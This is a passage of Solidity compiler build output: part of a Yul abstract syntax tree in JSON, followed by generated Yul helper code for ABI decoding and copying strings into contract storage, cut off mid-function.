,"type":""}]},{"body":{"nativeSrc":"4288:27:14","nodeType":"YulBlock","src":"4288:27:14","statements":[{"nativeSrc":"4290:23:14","nodeType":"YulAssignment","src":"4290:23:14","value":{"name":"dataArea","nativeSrc":"4305:8:14","nodeType":"YulIdentifier","src":"4305:8:14"},"variableNames":[{"name":"deleteStart","nativeSrc":"4290:11:14","nodeType":"YulIdentifier","src":"4290:11:14"}]}]},"condition":{"arguments":[{"name":"startIndex","nativeSrc":"4272:10:14","nodeType":"YulIdentifier","src":"4272:10:14"},{"kind":"number","nativeSrc":"4284:2:14","nodeType":"YulLiteral","src":"4284:2:14","type":"","value":"32"}],"functionName":{"name":"lt","nativeSrc":"4269:2:14","nodeType":"YulIdentifier","src":"4269:2:14"},"nativeSrc":"4269:18:14","nodeType":"YulFunctionCall","src":"4269:18:14"},"nativeSrc":"4266:49:14","nodeType":"YulIf","src":"4266:49:14"},{"expression":{"arguments":[{"name":"deleteStart","nativeSrc":"4357:11:14","nodeType":"YulIdentifier","src":"4357:11:14"},{"arguments":[{"name":"dataArea","nativeSrc":"4374:8:14","nodeType":"YulIdentifier","src":"4374:8:14"},{"arguments":[{"name":"len","nativeSrc":"4402:3:14","nodeType":"YulIdentifier","src":"4402:3:14"}],"functionName":{"name":"divide_by_32_ceil","nativeSrc":"4384:17:14","nodeType":"YulIdentifier","src":"4384:17:14"},"nativeSrc":"4384:22:14","nodeType":"YulFunctionCall","src":"4384:22:14"}],"functionName":{"name":"add","nativeSrc":"4370:3:14","nodeType":"YulIdentifier","src":"4370:3:14"},"nativeSrc":"4370:37:14","nodeType":"YulFunctionCall","src":"4370:37:14"}],"functionName":{"name":"clear_storage_range_t_bytes1","nativeSrc":"4328:28:14","nodeType":"YulIdentifier","src":"4328:28:14"},"nativeSrc":"4328:80:14","nodeType":"YulFunctionCall","src":"4328:80:14"},"nativeSrc":"4328:80:14","nodeType":"YulExpressionStatement","src":"4328:80:14"}]},"condition":{"arguments":[{"name":"len","nativeSrc":"3978:3:14","nodeType":"YulIdentifier","src":"3978:3:14"},{"kind":"number","nativeSrc":"3983:2:14","nodeType":"YulLiteral","src":"3983:2:14","type":"","value":"31"}],"functionName":{"name":"gt","nativeSrc":"3975:2:14","nodeType":"YulIdentifier","src":"3975:2:14"},"nativeSrc":"3975:11:14","nodeType":"YulFunctionCall","src":"3975:11:14"},"nativeSrc":"3972:446:14","nodeType":"YulIf","src":"3972:446:14"}]},"name":"clean_up_bytearray_end_slots_t_string_storage","nativeSrc":"3882:543:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"array","nativeSrc":"3937:5:14","nodeType":"YulTypedName","src":"3937:5:14","type":""},{"name":"len","nativeSrc":"3944:3:14","nodeType":"YulTypedName","src":"3944:3:14","type":""},{"name":"startIndex","nativeSrc":"3949:10:14","nodeType":"YulTypedName","src":"3949:10:14","type":""}],"src":"3882:543:14"},{"body":{"nativeSrc":"4494:54:14","nodeType":"YulBlock","src":"4494:54:14","statements":[{"nativeSrc":"4504:37:14","nodeType":"YulAssignment","src":"4504:37:14","value":{"arguments":[{"name":"bits","nativeSrc":"4529:4:14","nodeType":"YulIdentifier","src":"4529:4:14"},{"name":"value","nativeSrc":"4535:5:14","nodeType":"YulIdentifier","src":"4535:5:14"}],"functionName":{"name":"shr","nativeSrc":"4525:3:14","nodeType":"YulIdentifier","src":"4525:3:14"},"nativeSrc":"4525:16:14","nodeType":"YulFunctionCall","src":"4525:16:14"},"variableNames":[{"name":"newValue","nativeSrc":"4504:8:14","nodeType":"YulIdentifier","src":"4504:8:14"}]}]},"name":"shift_right_unsigned_dynamic","nativeSrc":"4431:117:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"bits","nativeSrc":"4469:4:14","nodeType":"YulTypedName","src":"4469:4:14","type":""},{"name":"value","nativeSrc":"4475:5:14","nodeType":"YulTypedName","src":"4475:5:14","type":""}],"returnVariables":[{"name":"newValue","nativeSrc":"4485:8:14","nodeType":"YulTypedName","src":"4485:8:14","type":""}],"src":"4431:117:14"},{"body":{"nativeSrc":"4605:118:14","nodeType":"YulBlock","src":"4605:118:14","statements":[{"nativeSrc":"4615:68:14","nodeType":"YulVariableDeclaration","src":"4615:68:14","value":{"arguments":[{"arguments":[{"arguments":[{"kind":"number","nativeSrc":"4664:1:14","nodeType":"YulLiteral","src":"4664:1:14","type":"","value":"8"},{"name":"bytes","nativeSrc":"4667:5:14","nodeType":"YulIdentifier","src":"4667:5:14"}],"functionName":{"name":"mul","nativeSrc":"4660:3:14","nodeType":"YulIdentifier","src":"4660:3:14"},"nativeSrc":"4660:13:14","nodeType":"YulFunctionCall","src":"4660:13:14"},{"arguments":[{"kind":"number","nativeSrc":"4679:1:14","nodeType":"YulLiteral","src":"4679:1:14","type":"","value":"0"}],"functionName":{"name":"not","nativeSrc":"4675:3:14","nodeType":"YulIdentifier","src":"4675:3:14"},"nativeSrc":"4675:6:14","nodeType":"YulFunctionCall","src":"4675:6:14"}],"functionName":{"name":"shift_right_unsigned_dynamic","nativeSrc":"4631:28:14","nodeType":"YulIdentifier","src":"4631:28:14"},"nativeSrc":"4631:51:14","nodeType":"YulFunctionCall","src":"4631:51:14"}],"functionName":{"name":"not","nativeSrc":"4627:3:14","nodeType":"YulIdentifier","src":"4627:3:14"},"nativeSrc":"4627:56:14","nodeType":"YulFunctionCall","src":"4627:56:14"},"variables":[{"name":"mask","nativeSrc":"4619:4:14","nodeType":"YulTypedName","src":"4619:4:14","type":""}]},{"nativeSrc":"4692:25:14","nodeType":"YulAssignment","src":"4692:25:14","value":{"arguments":[{"name":"data","nativeSrc":"4706:4:14","nodeType":"YulIdentifier","src":"4706:4:14"},{"name":"mask","nativeSrc":"4712:4:14","nodeType":"YulIdentifier","src":"4712:4:14"}],"functionName":{"name":"and","nativeSrc":"4702:3:14","nodeType":"YulIdentifier","src":"4702:3:14"},"nativeSrc":"4702:15:14","nodeType":"YulFunctionCall","src":"4702:15:14"},"variableNames":[{"name":"result","nativeSrc":"4692:6:14","nodeType":"YulIdentifier","src":"4692:6:14"}]}]},"name":"mask_bytes_dynamic","nativeSrc":"4554:169:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"data","nativeSrc":"4582:4:14","nodeType":"YulTypedName","src":"4582:4:14","type":""},{"name":"bytes","nativeSrc":"4588:5:14","nodeType":"YulTypedName","src":"4588:5:14","type":""}],"returnVariables":[{"name":"result","nativeSrc":"4598:6:14","nodeType":"YulTypedName","src":"4598:6:14","type":""}],"src":"4554:169:14"},{"body":{"nativeSrc":"4809:214:14","nodeType":"YulBlock","src":"4809:214:14","statements":[{"nativeSrc":"4942:37:14","nodeType":"YulAssignment","src":"4942:37:14","value":{"arguments":[{"name":"data","nativeSrc":"4969:4:14","nodeType":"YulIdentifier","src":"4969:4:14"},{"name":"len","nativeSrc":"4975:3:14","nodeType":"YulIdentifier","src":"4975:3:14"}],"functionName":{"name":"mask_bytes_dynamic","nativeSrc":"4950:18:14","nodeType":"YulIdentifier","src":"4950:18:14"},"nativeSrc":"4950:29:14","nodeType":"YulFunctionCall","src":"4950:29:14"},"variableNames":[{"name":"data","nativeSrc":"4942:4:14","nodeType":"YulIdentifier","src":"4942:4:14"}]},{"nativeSrc":"4988:29:14","nodeType":"YulAssignment","src":"4988:29:14","value":{"arguments":[{"name":"data","nativeSrc":"4999:4:14","nodeType":"YulIdentifier","src":"4999:4:14"},{"arguments":[{"kind":"number","nativeSrc":"5009:1:14","nodeType":"YulLiteral","src":"5009:1:14","type":"","value":"2"},{"name":"len","nativeSrc":"5012:3:14","nodeType":"YulIdentifier","src":"5012:3:14"}],"functionName":{"name":"mul","nativeSrc":"5005:3:14","nodeType":"YulIdentifier","src":"5005:3:14"},"nativeSrc":"5005:11:14","nodeType":"YulFunctionCall","src":"5005:11:14"}],"functionName":{"name":"or","nativeSrc":"4996:2:14","nodeType":"YulIdentifier","src":"4996:2:14"},"nativeSrc":"4996:21:14","nodeType":"YulFunctionCall","src":"4996:21:14"},"variableNames":[{"name":"used","nativeSrc":"4988:4:14","nodeType":"YulIdentifier","src":"4988:4:14"}]}]},"name":"extract_used_part_and_set_length_of_short_byte_array","nativeSrc":"4728:295:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"data","nativeSrc":"4790:4:14","nodeType":"YulTypedName","src":"4790:4:14","type":""},{"name":"len","nativeSrc":"4796:3:14","nodeType":"YulTypedName","src":"4796:3:14","type":""}],"returnVariables":[{"name":"used","nativeSrc":"4804:4:14","nodeType":"YulTypedName","src":"4804:4:14","type":""}],"src":"4728:295:14"},{"body":{"nativeSrc":"5120:1303:14","nodeType":"YulBlock","src":"5120:1303:14","statements":[{"nativeSrc":"5131:51:14","nodeType":"YulVariableDeclaration","src":"5131:51:14","value":{"arguments":[{"name":"src","nativeSrc":"5178:3:14","nodeType":"YulIdentifier","src":"5178:3:14"}],"functionName":{"name":"array_length_t_string_memory_ptr","nativeSrc":"5145:32:14","nodeType":"YulIdentifier","src":"5145:32:14"},"nativeSrc":"5145:37:14","nodeType":"YulFunctionCall","src":"5145:37:14"},"variables":[{"name":"newLen","nativeSrc":"5135:6:14","nodeType":"YulTypedName","src":"5135:6:14","type":""}]},{"body":{"nativeSrc":"5267:22:14","nodeType":"YulBlock","src":"5267:22:14","statements":[{"expression":{"arguments":[],"functionName":{"name":"panic_error_0x41","nativeSrc":"5269:16:14","nodeType":"YulIdentifier","src":"5269:16:14"},"nativeSrc":"5269:18:14","nodeType":"YulFunctionCall","src":"5269:18:14"},"nativeSrc":"5269:18:14","nodeType":"YulExpressionStatement","src":"5269:18:14"}]},"condition":{"arguments":[{"name":"newLen","nativeSrc":"5239:6:14","nodeType":"YulIdentifier","src":"5239:6:14"},{"kind":"number","nativeSrc":"5247:18:14","nodeType":"YulLiteral","src":"5247:18:14","type":"","value":"0xffffffffffffffff"}],"functionName":{"name":"gt","nativeSrc":"5236:2:14","nodeType":"YulIdentifier","src":"5236:2:14"},"nativeSrc":"5236:30:14","nodeType":"YulFunctionCall","src":"5236:30:14"},"nativeSrc":"5233:56:14","nodeType":"YulIf","src":"5233:56:14"},{"nativeSrc":"5299:52:14","nodeType":"YulVariableDeclaration","src":"5299:52:14","value":{"arguments":[{"arguments":[{"name":"slot","nativeSrc":"5345:4:14","nodeType":"YulIdentifier","src":"5345:4:14"}],"functionName":{"name":"sload","nativeSrc":"5339:5:14","nodeType":"YulIdentifier","src":"5339:5:14"},"nativeSrc":"5339:11:14","nodeType":"YulFunctionCall","src":"5339:11:14"}],"functionName":{"name":"extract_byte_array_length","nativeSrc":"5313:25:14","nodeType":"YulIdentifier","src":"5313:25:14"},"nativeSrc":"5313:38:14","nodeType":"YulFunctionCall","src":"5313:38:14"},"variables":[{"name":"oldLen","nativeSrc":"5303:6:14","nodeType":"YulTypedName","src":"5303:6:14","type":""}]},{"expression":{"arguments":[{"name":"slot","nativeSrc":"5444:4:14","nodeType":"YulIdentifier","src":"5444:4:14"},{"name":"oldLen","nativeSrc":"5450:6:14","nodeType":"YulIdentifier","src":"5450:6:14"},{"name":"newLen","nativeSrc":"5458:6:14","nodeType":"YulIdentifier","src":"5458:6:14"}],"functionName":{"name":"clean_up_bytearray_end_slots_t_string_storage","nativeSrc":"5398:45:14","nodeType":"YulIdentifier","src":"5398:45:14"},"nativeSrc":"5398:67:14","nodeType":"YulFunctionCall","src":"5398:67:14"},"nativeSrc":"5398:67:14","nodeType":"YulExpressionStatement","src":"5398:67:14"},{"nativeSrc":"5475:18:14","nodeType":"YulVariableDeclaration","src":"5475:18:14","value":{"kind":"number","nativeSrc":"5492:1:14","nodeType":"YulLiteral","src":"5492:1:14","type":"","value":"0"},"variables":[{"name":"srcOffset","nativeSrc":"5479:9:14","nodeType":"YulTypedName","src":"5479:9:14","type":""}]},{"nativeSrc":"5503:17:14","nodeType":"YulAssignment","src":"5503:17:14","value":{"kind":"number","nativeSrc":"5516:4:14","nodeType":"YulLiteral","src":"5516:4:14","type":"","value":"0x20"},"variableNames":[{"name":"srcOffset","nativeSrc":"5503:9:14","nodeType":"YulIdentifier","src":"5503:9:14"}]},{"cases":[{"body":{"nativeSrc":"5567:611:14","nodeType":"YulBlock","src":"5567:611:14","statements":[{"nativeSrc":"5581:37:14","nodeType":"YulVariableDeclaration","src":"5581:37:14","value":{"arguments":[{"name":"newLen","nativeSrc":"5600:6:14","nodeType":"YulIdentifier","src":"5600:6:14"},{"arguments":[{"kind":"number","nativeSrc":"5612:4:14","nodeType":"YulLiteral","src":"5612:4:14","type":"","value":"0x1f"}],"functionName":{"name":"not","nativeSrc":"5608:3:14","nodeType":"YulIdentifier","src":"5608:3:14"},"nativeSrc":"5608:9:14","nodeType":"YulFunctionCall","src":"5608:9:14"}],"functionName":{"name":"and","nativeSrc":"5596:3:14","nodeType":"YulIdentifier","src":"5596:3:14"},"nativeSrc":"5596:22:14","nodeType":"YulFunctionCall","src":"5596:22:14"},"variables":[{"name":"loopEnd","nativeSrc":"5585:7:14","nodeType":"YulTypedName","src":"5585:7:14","type":""}]},{"nativeSrc":"5632:51:14","nodeType":"YulVariableDeclaration","src":"5632:51:14","value":{"arguments":[{"name":"slot","nativeSrc":"5678:4:14","nodeType":"YulIdentifier","src":"5678:4:14"}],"functionName":{"name":"array_dataslot_t_string_storage","nativeSrc":"5646:31:14","nodeType":"YulIdentifier","src":"5646:31:14"},"nativeSrc":"5646:37:14","nodeType":"YulFunctionCall","src":"5646:37:14"},"variables":[{"name":"dstPtr","nativeSrc":"5636:6:14","nodeType":"YulTypedName","src":"5636:6:14","type":""}]},{"nativeSrc":"5696:10:14","nodeType":"YulVariableDeclaration","src":"5696:10:14","value":{"kind":"number","nativeSrc":"5705:1:14","nodeType":"YulLiteral","src":"5705:1:14","type":"","value":"0"},"variables":[{"name":"i","nativeSrc":"5700:1:14","nodeType":"YulTypedName","src":"5700:1:14","type":""}]},{"body":{"nativeSrc":"5764:163:14","nodeType":"YulBlock","src":"5764:163:14","statements":[{"expression":{"arguments":[{"name":"dstPtr","nativeSrc":"5789:6:14","nodeType":"YulIdentifier","src":"5789:6:14"},{"arguments":[{"arguments":[{"name":"src","nativeSrc":"5807:3:14","nodeType":"YulIdentifier","src":"5807:3:14"},{"name":"srcOffset","nativeSrc":"5812:9:14","nodeType":"YulIdentifier","src":"5812:9:14"}],"functionName":{"name":"add","nativeSrc":"5803:3:14","nodeType":"YulIdentifier","src":"5803:3:14"},"nativeSrc":"5803:19:14","nodeType":"YulFunctionCall","src":"5803:19:14"}],"functionName":{"name":"mload","nativeSrc":"5797:5:14","nodeType":"YulIdentifier","src":"5797:5:14"},"nativeSrc":"5797:26:14","nodeType":"YulFunctionCall","src":"5797:26:14"}],"functionName":{"name":"sstore","nativeSrc":"5782:6:14","nodeType":"YulIdentifier","src":"5782:6:14"},"nativeSrc":"5782:42:14","nodeType":"YulFunctionCall","src":"5782:42:14"},"nativeSrc":"5782:42:14","nodeType":"YulExpressionStatement","src":"5782:42:14"},{"nativeSrc":"5841:24:14","nodeType":"YulAssignment","src":"5841:24:14","value":{"arguments":[{"name":"dstPtr","nativeSrc":"5855:6:14","nodeType":"YulIdentifier","src":"5855:6:14"},{"kind":"number","nativeSrc":"5863:1:14","nodeType":"YulLiteral","src":"5863:1:14","type":"","value":"1"}],"functionName":{"name":"add","nativeSrc":"5851:3:14","nodeType":"YulIdentifier","src":"5851:3:14"},"nativeSrc":"5851:14:14","nodeType":"YulFunctionCall","src":"5851:14:14"},"variableNames":[{"name":"dstPtr","nativeSrc":"5841:6:14","nodeType":"YulIdentifier","src":"5841:6:14"}]},{"nativeSrc":"5882:31:14","nodeType":"YulAssignment","src":"5882:31:14","value":{"arguments":[{"name":"srcOffset","nativeSrc":"5899:9:14","nodeType":"YulIdentifier","src":"5899:9:14"},{"kind":"number","nativeSrc":"5910:2:14","nodeType":"YulLiteral","src":"5910:2:14","type":"","value":"32"}],"functionName":{"name":"add","nativeSrc":"5895:3:14","nodeType":"YulIdentifier","src":"5895:3:14"},"nativeSrc":"5895:18:14","nodeType":"YulFunctionCall","src":"5895:18:14"},"variableNames":[{"name":"srcOffset","nativeSrc":"5882:9:14","nodeType":"YulIdentifier","src":"5882:9:14"}]}]},"condition":{"arguments":[{"name":"i","nativeSrc":"5730:1:14","nodeType":"YulIdentifier","src":"5730:1:14"},{"name":"loopEnd","nativeSrc":"5733:7:14","nodeType":"YulIdentifier","src":"5733:7:14"}],"functionName":{"name":"lt","nativeSrc":"5727:2:14","nodeType":"YulIdentifier","src":"5727:2:14"},"nativeSrc":"5727:14:14","nodeType":"YulFunctionCall","src":"5727:14:14"},"nativeSrc":"5719:208:14","nodeType":"YulForLoop","post":{"nativeSrc":"5742:21:14","nodeType":"YulBlock","src":"5742:21:14","statements":[{"nativeSrc":"5744:17:14","nodeType":"YulAssignment","src":"5744:17:14","value":{"arguments":[{"name":"i","nativeSrc":"5753:1:14","nodeType":"YulIdentifier","src":"5753:1:14"},{"kind":"number","nativeSrc":"5756:4:14","nodeType":"YulLiteral","src":"5756:4:14","type":"","value":"0x20"}],"functionName":{"name":"add","nativeSrc":"5749:3:14","nodeType":"YulIdentifier","src":"5749:3:14"},"nativeSrc":"5749:12:14","nodeType":"YulFunctionCall","src":"5749:12:14"},"variableNames":[{"name":"i","nativeSrc":"5744:1:14","nodeType":"YulIdentifier","src":"5744:1:14"}]}]},"pre":{"nativeSrc":"5723:3:14","nodeType":"YulBlock","src":"5723:3:14","statements":[]},"src":"5719:208:14"},{"body":{"nativeSrc":"5963:156:14","nodeType":"YulBlock","src":"5963:156:14","statements":[{"nativeSrc":"5981:43:14","nodeType":"YulVariableDeclaration","src":"5981:43:14","value":{"arguments":[{"arguments":[{"name":"src","nativeSrc":"6008:3:14","nodeType":"YulIdentifier","src":"6008:3:14"},{"name":"srcOffset","nativeSrc":"6013:9:14","nodeType":"YulIdentifier","src":"6013:9:14"}],"functionName":{"name":"add","nativeSrc":"6004:3:14","nodeType":"YulIdentifier","src":"6004:3:14"},"nativeSrc":"6004:19:14","nodeType":"YulFunctionCall","src":"6004:19:14"}],"functionName":{"name":"mload","nativeSrc":"5998:5:14","nodeType":"YulIdentifier","src":"5998:5:14"},"nativeSrc":"5998:26:14","nodeType":"YulFunctionCall","src":"5998:26:14"},"variables":[{"name":"lastValue","nativeSrc":"5985:9:14","nodeType":"YulTypedName","src":"5985:9:14","type":""}]},{"expression":{"arguments":[{"name":"dstPtr","nativeSrc":"6048:6:14","nodeType":"YulIdentifier","src":"6048:6:14"},{"arguments":[{"name":"lastValue","nativeSrc":"6075:9:14","nodeType":"YulIdentifier","src":"6075:9:14"},{"arguments":[{"name":"newLen","nativeSrc":"6090:6:14","nodeType":"YulIdentifier","src":"6090:6:14"},{"kind":"number","nativeSrc":"6098:4:14","nodeType":"YulLiteral","src":"6098:4:14","type":"","value":"0x1f"}],"functionName":{"name":"and","nativeSrc":"6086:3:14","nodeType":"YulIdentifier","src":"6086:3:14"},"nativeSrc":"6086:17:14","nodeType":"YulFunctionCall","src":"6086:17:14"}],"functionName":{"name":"mask_bytes_dynamic","nativeSrc":"6056:18:14","nodeType":"YulIdentifier","src":"6056:18:14"},"nativeSrc":"6056:48:14","nodeType":"YulFunctionCall","src":"6056:48:14"}],"functionName":{"name":"sstore","nativeSrc":"6041:6:14","nodeType":"YulIdentifier","src":"6041:6:14"},"nativeSrc":"6041:64:14","nodeType":"YulFunctionCall","src":"6041:64:14"},"nativeSrc":"6041:64:14","nodeType":"YulExpressionStatement","src":"6041:64:14"}]},"condition":{"arguments":[{"name":"loopEnd","nativeSrc":"5946:7:14","nodeType":"YulIdentifier","src":"5946:7:14"},{"name":"newLen","nativeSrc":"5955:6:14","nodeType":"YulIdentifier","src":"5955:6:14"}],"functionName":{"name":"lt","nativeSrc":"5943:2:14","nodeType":"YulIdentifier","src":"5943:2:14"},"nativeSrc":"5943:19:14","nodeType":"YulFunctionCall","src":"5943:19:14"},"nativeSrc":"5940:179:14","nodeType":"YulIf","src":"5940:179:14"},{"expression":{"arguments":[{"name":"slot","nativeSrc":"6139:4:14","nodeType":"YulIdentifier","src":"6139:4:14"},{"arguments":[{"arguments":[{"name":"newLen","nativeSrc":"6153:6:14","nodeType":"YulIdentifier","src":"6153:6:14"},{"kind":"number","nativeSrc":"6161:1:14","nodeType":"YulLiteral","src":"6161:1:14","type":"","value":"2"}],"functionName":{"name":"mul","nativeSrc":"6149:3:14","nodeType":"YulIdentifier","src":"6149:3:14"},"nativeSrc":"6149:14:14","nodeType":"YulFunctionCall","src":"6149:14:14"},{"kind":"number","nativeSrc":"6165:1:14","nodeType":"YulLiteral","src":"6165:1:14","type":"","value":"1"}],"functionName":{"name":"add","nativeSrc":"6145:3:14","nodeType":"YulIdentifier","src":"6145:3:14"},"nativeSrc":"6145:22:14","nodeType":"YulFunctionCall","src":"6145:22:14"}],"functionName":{"name":"sstore","nativeSrc":"6132:6:14","nodeType":"YulIdentifier","src":"6132:6:14"},"nativeSrc":"6132:36:14","nodeType":"YulFunctionCall","src":"6132:36:14"},"nativeSrc":"6132:36:14","nodeType":"YulExpressionStatement","src":"6132:36:14"}]},"nativeSrc":"5560:618:14","nodeType":"YulCase","src":"5560:618:14","value":{"kind":"number","nativeSrc":"5565:1:14","nodeType":"YulLiteral","src":"5565:1:14","type":"","value":"1"}},{"body":{"nativeSrc":"6195:222:14","nodeType":"YulBlock","src":"6195:222:14","statements":[{"nativeSrc":"6209:14:14","nodeType":"YulVariableDeclaration","src":"6209:14:14","value":{"kind":"number","nativeSrc":"6222:1:14","nodeType":"YulLiteral","src":"6222:1:14","type":"","value":"0"},"variables":[{"name":"value","nativeSrc":"6213:5:14","nodeType":"YulTypedName","src":"6213:5:14","type":""}]},{"body":{"nativeSrc":"6246:67:14","nodeType":"YulBlock","src":"6246:67:14","statements":[{"nativeSrc":"6264:35:14","nodeType":"YulAssignment","src":"6264:35:14","value":{"arguments":[{"arguments":[{"name":"src","nativeSrc":"6283:3:14","nodeType":"YulIdentifier","src":"6283:3:14"},{"name":"srcOffset","nativeSrc":"6288:9:14","nodeType":"YulIdentifier","src":"6288:9:14"}],"functionName":{"name":"add","nativeSrc":"6279:3:14","nodeType":"YulIdentifier","src":"6279:3:14"},"nativeSrc":"6279:19:14","nodeType":"YulFunctionCall","src":"6279:19:14"}],"functionName":{"name":"mload","nativeSrc":"6273:5:14","nodeType":"YulIdentifier","src":"6273:5:14"},"nativeSrc":"6273:26:14","nodeType":"YulFunctionCall","src":"6273:26:14"},"variableNames":[{"name":"value","nativeSrc":"6264:5:14","nodeType":"YulIdentifier","src":"6264:5:14"}]}]},"condition":{"name":"newLen","nativeSrc":"6239:6:14","nodeType":"YulIdentifier","src":"6239:6:14"},"nativeSrc":"6236:77:14","nodeType":"YulIf","src":"6236:77:14"},{"expression":{"arguments":[{"name":"slot","nativeSrc":"6333:4:14","nodeType":"YulIdentifier","src":"6333:4:14"},{"arguments":[{"name":"value","nativeSrc":"6392:5:14","nodeType":"YulIdentifier","src":"6392:5:14"},{"name":"newLen","nativeSrc":"6399:6:14","nodeType":"YulIdentifier","src":"6399:6:14"}],"functionName":{"name":"extract_used_part_and_set_length_of_short_byte_array","nativeSrc":"6339:52:14","nodeType":"YulIdentifier","src":"6339:52:14"},"nativeSrc":"6339:67:14","nodeType":"YulFunctionCall","src":"6339:67:14"}],"functionName":{"name":"sstore","nativeSrc":"6326:6:14","nodeType":"YulIdentifier","src":"6326:6:14"},"nativeSrc":"6326:81:14","nodeType":"YulFunctionCall","src":"6326:81:14"},"nativeSrc":"6326:81:14","nodeType":"YulExpressionStatement","src":"6326:81:14"}]},"nativeSrc":"6187:230:14","nodeType":"YulCase","src":"6187:230:14","value":"default"}],"expression":{"arguments":[{"name":"newLen","nativeSrc":"5540:6:14","nodeType":"YulIdentifier","src":"5540:6:14"},{"kind":"number","nativeSrc":"5548:2:14","nodeType":"YulLiteral","src":"5548:2:14","type":"","value":"31"}],"functionName":{"name":"gt","nativeSrc":"5537:2:14","nodeType":"YulIdentifier","src":"5537:2:14"},"nativeSrc":"5537:14:14","nodeType":"YulFunctionCall","src":"5537:14:14"},"nativeSrc":"5530:887:14","nodeType":"YulSwitch","src":"5530:887:14"}]},"name":"copy_byte_array_to_storage_from_t_string_memory_ptr_to_t_string_storage","nativeSrc":"5028:1395:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"slot","nativeSrc":"5109:4:14","nodeType":"YulTypedName","src":"5109:4:14","type":""},{"name":"src","nativeSrc":"5115:3:14","nodeType":"YulTypedName","src":"5115:3:14","type":""}],"src":"5028:1395:14"}]},"contents":"{\n\n    function allocate_unbounded() -> memPtr {\n        memPtr := mload(64)\n    }\n\n    function revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() {\n        revert(0, 0)\n    }\n\n    function revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() {\n        revert(0, 0)\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function validator_revert_t_address(value) {\n        if iszero(eq(value, cleanup_t_address(value))) { revert(0, 0) }\n    }\n\n    function abi_decode_t_address_fromMemory(offset, end) -> value {\n        value := mload(offset)\n        validator_revert_t_address(value)\n    }\n\n    function abi_decode_tuple_t_address_fromMemory(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address_fromMemory(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function array_length_t_string_memory_ptr(value) -> length {\n\n        length := mload(value)\n\n    }\n\n    function panic_error_0x41() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x41)\n        revert(0, 0x24)\n    }\n\n    function panic_error_0x22() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x22)\n        revert(0, 0x24)\n    }\n\n    function extract_byte_array_length(data) -> length {\n        length := div(data, 2)\n        let outOfPlaceEncoding := and(data, 1)\n        if iszero(outOfPlaceEncoding) {\n            length := and(length, 0x7f)\n        }\n\n        if eq(outOfPlaceEncoding, lt(length, 32)) {\n            panic_error_0x22()\n        }\n    }\n\n    function array_dataslot_t_string_storage(ptr) -> data {\n        data := ptr\n\n        mstore(0, ptr)\n        data := keccak256(0, 0x20)\n\n    }\n\n    function divide_by_32_ceil(value) -> result {\n        result := div(add(value, 31), 32)\n    }\n\n    function shift_left_dynamic(bits, value) -> newValue {\n        newValue :=\n\n        shl(bits, value)\n\n    }\n\n    function update_byte_slice_dynamic32(value, shiftBytes, toInsert) -> result {\n        let shiftBits := mul(shiftBytes, 8)\n        let mask := shift_left_dynamic(shiftBits, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n        toInsert := shift_left_dynamic(shiftBits, toInsert)\n        value := and(value, not(mask))\n        result := or(value, and(toInsert, mask))\n    }\n\n    function cleanup_t_uint256(value) -> cleaned {\n        cleaned := value\n    }\n\n    function identity(value) -> ret {\n        ret := value\n    }\n\n    function convert_t_uint256_to_t_uint256(value) -> converted {\n        converted := cleanup_t_uint256(identity(cleanup_t_uint256(value)))\n    }\n\n    function prepare_store_t_uint256(value) -> ret {\n        ret := value\n    }\n\n    function update_storage_value_t_uint256_to_t_uint256(slot, offset, value_0) {\n        let convertedValue_0 := convert_t_uint256_to_t_uint256(value_0)\n        sstore(slot, update_byte_slice_dynamic32(sload(slot), offset, prepare_store_t_uint256(convertedValue_0)))\n    }\n\n    function zero_value_for_split_t_uint256() -> ret {\n        ret := 0\n    }\n\n    function storage_set_to_zero_t_uint256(slot, offset) {\n        let zero_0 := zero_value_for_split_t_uint256()\n        update_storage_value_t_uint256_to_t_uint256(slot, offset, zero_0)\n    }\n\n    function clear_storage_range_t_bytes1(start, end) {\n        for {} lt(start, end) { start := add(start, 1) }\n        {\n            storage_set_to_zero_t_uint256(start, 0)\n        }\n    }\n\n    function clean_up_bytearray_end_slots_t_string_storage(array, len, startIndex) {\n\n        if gt(len, 31) {\n            let dataArea := array_dataslot_t_string_storage(array)\n            let deleteStart := add(dataArea, divide_by_32_ceil(startIndex))\n            // If we are clearing array to be short byte array, we want to clear only data starting from array data area.\n            if lt(startIndex, 32) { deleteStart := dataArea }\n            clear_storage_range_t_bytes1(deleteStart, add(dataArea, divide_by_32_ceil(len)))\n        }\n\n    }\n\n    function shift_right_unsigned_dynamic(bits, value) -> newValue {\n        newValue :=\n\n        shr(bits, value)\n\n    }\n\n    function mask_bytes_dynamic(data, bytes) -> result {\n        let mask := not(shift_right_unsigned_dynamic(mul(8, bytes), not(0)))\n        result := and(data, mask)\n    }\n    function extract_used_part_and_set_length_of_short_byte_array(data, len) -> used {\n        // we want to save only elements that are part of the array after resizing\n        // others should be set to zero\n        data := mask_bytes_dynamic(data, len)\n        used := or(data, mul(2, len))\n    }\n    function copy_byte_array_to_storage_from_t_string_memory_ptr_to_t_string_storage(slot, src) {\n\n        let newLen := array_length_t_string_memory_ptr(src)\n        // Make sure array length is sane\n        if gt(newLen, 0xffffffffffffffff) { panic_error_0x41() }\n\n        let oldLen := extract_byte_array_length(sload(slot))\n\n        // potentially truncate data\n        clean_up_bytearray_end_slots_t_string_storage(slot, oldLen, newLen)\n\n        let srcOffset := 0\n\n        srcOffset := 0x20\n\n        switch gt(newLen, 31)\n        case 1 {\n            let 